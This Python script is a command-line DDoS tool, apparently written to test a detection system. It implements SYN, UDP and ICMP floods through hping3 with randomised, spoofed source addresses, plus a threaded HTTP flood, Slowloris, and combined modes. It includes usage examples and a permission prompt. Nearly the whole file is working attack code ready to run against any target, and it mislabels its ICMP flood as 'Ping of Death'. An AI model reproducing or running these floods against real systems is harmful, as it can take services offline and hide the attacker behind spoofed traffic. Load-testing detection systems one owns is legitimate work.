#!/usr/bin/env python3
"""
DDoS Attack Tool - For Testing DDoS Detection System

⚠️  WARNING: This tool is for EDUCATIONAL/TESTING purposes ONLY
    Only use on systems you own or have explicit permission to test.
    Unauthorized use may be illegal.

Usage:
    python3 ddos_attack.py --target <IP> --port <PORT> --attack <TYPE> --duration <SECONDS>
    
Examples:
    # SYN Flood attack
    sudo python3 ddos_attack.py --target 172.16.90.12 --port 80 --attack syn --duration 60
    
    # UDP Flood attack
    sudo python3 ddos_attack.py --target 172.16.90.12 --port 53 --attack udp --duration 30
    
    # HTTP Flood attack (no sudo needed)
    python3 ddos_attack.py --target 172.16.90.12 --port 80 --attack http --duration 60
    
    # Multiple attack types
    sudo python3 ddos_attack.py --target 172.16.90.12 --port 80 --attack all --duration 120
"""

import subprocess
import time
import sys
import argparse
import socket
import threading
import random
from datetime import datetime
from typing import List, Dict

class Colors:
    """Terminal colors"""
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'  # No Color

class DDoSAttackTool:
    """DDoS Attack Simulator for Testing Detection System"""
    
    def __init__(self, target: str, port: int = 80, verbose: bool = True):
        self.target = target
        self.port = port
        self.verbose = verbose
        self.stop_flag = False
        self.attack_stats = {
            'packets_sent': 0,
            'requests_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Validate target
        if not self._validate_target():
            raise ValueError(f"Invalid target: {target}")
    
    def _validate_target(self) -> bool:
        """Validate target IP/hostname"""
        try:
            socket.gethostbyname(self.target)
            return True
        except socket.gaierror:
            return False
    
    def _log(self, level: str, message: str):
        """Log message with color"""
        if not self.verbose:
            return
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        color_map = {
            'INFO': Colors.BLUE,
            'SUCCESS': Colors.GREEN,
            'WARNING': Colors.YELLOW,
            'ERROR': Colors.RED,
            'ATTACK': Colors.MAGENTA
        }
        
        color = color_map.get(level, Colors.NC)
        print(f"{color}[{level}]{Colors.NC} {timestamp} - {message}")
    
    def _check_tool_installed(self, tool: str) -> bool:
        """Check if required tool is installed"""
        try:
            subprocess.run(['which', tool], check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False
    
    # ========================================
    # LAYER 3/4 ATTACKS (Require root/sudo)
    # ========================================
    
    def syn_flood(self, duration: int = 30, rate: str = 'flood'):
        """
        SYN Flood Attack - TCP SYN packets without completing handshake
        
        Args:
            duration: Attack duration in seconds
            rate: 'flood' for maximum rate, or number like '1000' for packets/sec
        """
        self._log('ATTACK', f'🔴 Starting SYN FLOOD attack on {self.target}:{self.port}')
        self._log('INFO', f'Duration: {duration}s | Rate: {rate}')
        
        if not self._check_tool_installed('hping3'):
            self._log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        rate_flag = '--flood' if rate == 'flood' else f'-i u{1000000//int(rate)}'
        
        cmd = [
            'hping3',
            '-S',  # SYN flag
            rate_flag,
            '-p', str(self.port),
            '--rand-source',  # Random source IP
            self.target
        ]
        
        try:
            self.attack_stats['start_time'] = time.time()
            
            # Run attack with timeout
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            proc.terminate()
            
            self.attack_stats['end_time'] = time.time()
            self._log('SUCCESS', '✓ SYN flood attack completed')
            return True
            
        except Exception as e:
            self._log('ERROR', f'SYN flood failed: {str(e)}')
            return False
    
    def udp_flood(self, duration: int = 30, rate: str = 'flood'):
        """
        UDP Flood Attack - Send massive UDP packets
        
        Args:
            duration: Attack duration in seconds
            rate: 'flood' for maximum rate, or number for packets/sec
        """
        self._log('ATTACK', f'🔴 Starting UDP FLOOD attack on {self.target}:{self.port}')
        self._log('INFO', f'Duration: {duration}s | Rate: {rate}')
        
        if not self._check_tool_installed('hping3'):
            self._log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        rate_flag = '--flood' if rate == 'flood' else f'-i u{1000000//int(rate)}'
        
        cmd = [
            'hping3',
            '--udp',
            rate_flag,
            '-p', str(self.port),
            '--rand-source',
            self.target
        ]
        
        try:
            self.attack_stats['start_time'] = time.time()
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            proc.terminate()
            
            self.attack_stats['end_time'] = time.time()
            self._log('SUCCESS', '✓ UDP flood attack completed')
            return True
            
        except Exception as e:
            self._log('ERROR', f'UDP flood failed: {str(e)}')
            return False
    
    def icmp_flood(self, duration: int = 30):
        """
        ICMP Flood Attack (Ping Flood)
        
        Args:
            duration: Attack duration in seconds
        """
        self._log('ATTACK', f'🔴 Starting ICMP FLOOD (Ping of Death) on {self.target}')
        self._log('INFO', f'Duration: {duration}s')
        
        if not self._check_tool_installed('hping3'):
            self._log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        cmd = [
            'hping3',
            '--icmp',
            '--flood',
            '--rand-source',
            self.target
        ]
        
        try:
            self.attack_stats['start_time'] = time.time()
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            proc.terminate()
            
            self.attack_stats['end_time'] = time.time()
            self._log('SUCCESS', '✓ ICMP flood attack completed')
            return True
            
        except Exception as e:
            self._log('ERROR', f'ICMP flood failed: {str(e)}')
            return False
    
    # ========================================
    # LAYER 7 ATTACKS (HTTP/Application)
    # ========================================
    
    def http_flood(self, duration: int = 60, threads: int = 100, requests_per_thread: int = 1000):
        """
        HTTP Flood Attack - Massive HTTP requests
        
        Args:
            duration: Attack duration in seconds
            threads: Number of concurrent threads
            requests_per_thread: Requests per thread
        """
        self._log('ATTACK', f'🔴 Starting HTTP FLOOD attack on http://{self.target}:{self.port}')
        self._log('INFO', f'Duration: {duration}s | Threads: {threads} | Total requests: {threads * requests_per_thread}')
        
        def send_http_requests():
            """Thread worker to send HTTP requests"""
            end_time = time.time() + duration
            
            while time.time() < end_time and not self.stop_flag:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    
                    # Random HTTP request
                    methods = ['GET', 'POST', 'HEAD']
                    paths = ['/', '/index.html', '/api/data', '/admin', '/login']
                    
                    request = f"{random.choice(methods)} {random.choice(paths)} HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: Mozilla/5.0 (Attack-{random.randint(1000,9999)})\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    
                    sock.sendall(request.encode())
                    sock.recv(1024)  # Read response
                    sock.close()
                    
                    self.attack_stats['requests_sent'] += 1
                    
                except Exception as e:
                    self.attack_stats['errors'] += 1
                
                time.sleep(0.01)  # Small delay to avoid overwhelming
        
        try:
            self.attack_stats['start_time'] = time.time()
            
            # Launch threads
            attack_threads = []
            for i in range(threads):
                t = threading.Thread(target=send_http_requests)
                t.daemon = True
                t.start()
                attack_threads.append(t)
            
            # Wait for duration
            time.sleep(duration)
            self.stop_flag = True
            
            # Wait for threads to finish
            for t in attack_threads:
                t.join(timeout=5)
            
            self.attack_stats['end_time'] = time.time()
            
            total_requests = self.attack_stats['requests_sent']
            total_time = self.attack_stats['end_time'] - self.attack_stats['start_time']
            rps = total_requests / total_time if total_time > 0 else 0
            
            self._log('SUCCESS', f'✓ HTTP flood completed: {total_requests} requests ({rps:.2f} req/s)')
            self._log('INFO', f'Errors: {self.attack_stats["errors"]}')
            return True
            
        except Exception as e:
            self._log('ERROR', f'HTTP flood failed: {str(e)}')
            return False
    
    def slowloris(self, duration: int = 120, connections: int = 500):
        """
        Slowloris Attack - Keep HTTP connections open with slow headers
        
        Args:
            duration: Attack duration in seconds
            connections: Number of slow connections to maintain
        """
        self._log('ATTACK', f'🔴 Starting SLOWLORIS attack on {self.target}:{self.port}')
        self._log('INFO', f'Duration: {duration}s | Connections: {connections}')
        
        sockets_list = []
        
        def create_slow_socket():
            """Create slow connection"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                
                # Send partial HTTP request
                request = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                sock.send(request.encode())
                
                return sock
            except:
                return None
        
        try:
            self.attack_stats['start_time'] = time.time()
            
            # Create initial connections
            self._log('INFO', f'Creating {connections} slow connections...')
            for _ in range(connections):
                sock = create_slow_socket()
                if sock:
                    sockets_list.append(sock)
            
            self._log('INFO', f'Created {len(sockets_list)} connections. Sending slow headers...')
            
            # Keep connections alive with slow headers
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_flag:
                # Send partial headers to keep connections alive
                for sock in sockets_list[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets_list.remove(sock)
                        # Replace dead connection
                        new_sock = create_slow_socket()
                        if new_sock:
                            sockets_list.append(new_sock)
                
                self._log('INFO', f'Active connections: {len(sockets_list)}')
                time.sleep(10)  # Send header every 10 seconds
            
            # Close all connections
            for sock in sockets_list:
                try:
                    sock.close()
                except:
                    pass
            
            self.attack_stats['end_time'] = time.time()
            self._log('SUCCESS', '✓ Slowloris attack completed')
            return True
            
        except Exception as e:
            self._log('ERROR', f'Slowloris failed: {str(e)}')
            return False
    
    def dns_amplification(self, duration: int = 30):
        """
        DNS Amplification Attack - NOT IMPLEMENTED
        
        This attack requires spoofing source IP which is complex and potentially illegal.
        Included for reference only.
        """
        self._log('WARNING', 'DNS Amplification attack is NOT IMPLEMENTED')
        self._log('INFO', 'Reason: Requires IP spoofing which is illegal without permission')
        return False
    
    # ========================================
    # COMBINED ATTACKS
    # ========================================
    
    def mixed_attack(self, duration: int = 60):
        """
        Mixed Attack - Combination of multiple attack types
        
        Args:
            duration: Total attack duration in seconds
        """
        self._log('ATTACK', f'🔴 Starting MIXED ATTACK on {self.target}:{self.port}')
        self._log('INFO', f'Duration: {duration}s | Multiple attack vectors')
        
        attack_duration = duration // 3
        
        # Phase 1: SYN Flood
        self._log('INFO', '📍 Phase 1/3: SYN Flood')
        self.syn_flood(duration=attack_duration)
        
        # Phase 2: HTTP Flood
        self._log('INFO', '📍 Phase 2/3: HTTP Flood')
        self.http_flood(duration=attack_duration, threads=50)
        
        # Phase 3: UDP Flood
        self._log('INFO', '📍 Phase 3/3: UDP Flood')
        self.udp_flood(duration=attack_duration)
        
        self._log('SUCCESS', '✓ Mixed attack completed')
        return True
    
    def print_stats(self):
        """Print attack statistics"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.NC}")
        print(f"{Colors.CYAN}ATTACK STATISTICS{Colors.NC}")
        print(f"{Colors.CYAN}{'='*60}{Colors.NC}")
        print(f"Target: {self.target}:{self.port}")
        print(f"Packets sent: {self.attack_stats['packets_sent']}")
        print(f"HTTP requests: {self.attack_stats['requests_sent']}")
        print(f"Errors: {self.attack_stats['errors']}")
        
        if self.attack_stats['start_time'] and self.attack_stats['end_time']:
            duration = self.attack_stats['end_time'] - self.attack_stats['start_time']
            print(f"Duration: {duration:.2f} seconds")
            
            if self.attack_stats['requests_sent'] > 0:
                rps = self.attack_stats['requests_sent'] / duration
                print(f"Average rate: {rps:.2f} requests/second")
        
        print(f"{Colors.CYAN}{'='*60}{Colors.NC}\n")


def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Tool - For Testing Detection System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SYN Flood (requires sudo)
  sudo python3 ddos_attack.py -t 172.16.90.12 -p 80 -a syn -d 60
  
  # HTTP Flood (no sudo needed)
  python3 ddos_attack.py -t 172.16.90.12 -p 80 -a http -d 60 --threads 200
  
  # Slowloris attack
  python3 ddos_attack.py -t 172.16.90.12 -p 80 -a slowloris -d 120
  
  # Mixed attack (requires sudo)
  sudo python3 ddos_attack.py -t 172.16.90.12 -p 80 -a mixed -d 180

⚠️  WARNING: Use ONLY on systems you own or have permission to test!
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-a', '--attack', required=True, 
                       choices=['syn', 'udp', 'icmp', 'http', 'slowloris', 'mixed', 'all'],
                       help='Attack type')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads for HTTP attack (default: 100)')
    parser.add_argument('--rate', default='flood', help='Packet rate: "flood" or number (default: flood)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (less verbose)')
    parser.add_argument('--no-stats', action='store_true', help='Do not show statistics')
    
    args = parser.parse_args()
    
    # Warning banner
    print(f"{Colors.RED}{'='*60}{Colors.NC}")
    print(f"{Colors.RED}⚠️  DDoS ATTACK TOOL - TESTING PURPOSES ONLY ⚠️{Colors.NC}")
    print(f"{Colors.RED}{'='*60}{Colors.NC}")
    print(f"{Colors.YELLOW}Target: {args.target}:{args.port}{Colors.NC}")
    print(f"{Colors.YELLOW}Attack: {args.attack.upper()}{Colors.NC}")
    print(f"{Colors.YELLOW}Duration: {args.duration} seconds{Colors.NC}")
    print(f"{Colors.RED}{'='*60}{Colors.NC}\n")
    
    # Confirmation
    confirm = input(f"{Colors.YELLOW}Do you have permission to attack this target? (yes/no): {Colors.NC}")
    if confirm.lower() != 'yes':
        print(f"{Colors.RED}Attack cancelled.{Colors.NC}")
        sys.exit(0)
    
    try:
        # Initialize attack tool
        attacker = DDoSAttackTool(
            target=args.target,
            port=args.port,
            verbose=not args.quiet
        )
        
        # Execute attack
        if args.attack == 'syn':
            attacker.syn_flood(duration=args.duration, rate=args.rate)
        elif args.attack == 'udp':
            attacker.udp_flood(duration=args.duration, rate=args.rate)
        elif args.attack == 'icmp':
            attacker.icmp_flood(duration=args.duration)
        elif args.attack == 'http':
            attacker.http_flood(duration=args.duration, threads=args.threads)
        elif args.attack == 'slowloris':
            attacker.slowloris(duration=args.duration)
        elif args.attack == 'mixed':
            attacker.mixed_attack(duration=args.duration)
        elif args.attack == 'all':
            print(f"{Colors.YELLOW}Running ALL attack types sequentially...{Colors.NC}\n")
            attacker.syn_flood(duration=args.duration // 5)
            attacker.udp_flood(duration=args.duration // 5)
            attacker.icmp_flood(duration=args.duration // 5)
            attacker.http_flood(duration=args.duration // 5, threads=args.threads)
            attacker.slowloris(duration=args.duration // 5)
        
        # Show statistics
        if not args.no_stats:
            attacker.print_stats()
        
        print(f"{Colors.GREEN}✓ Attack completed successfully{Colors.NC}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Attack interrupted by user{Colors.NC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}✗ Attack failed: {str(e)}{Colors.NC}")
        sys.exit(1)


if __name__ == '__main__':
    main()
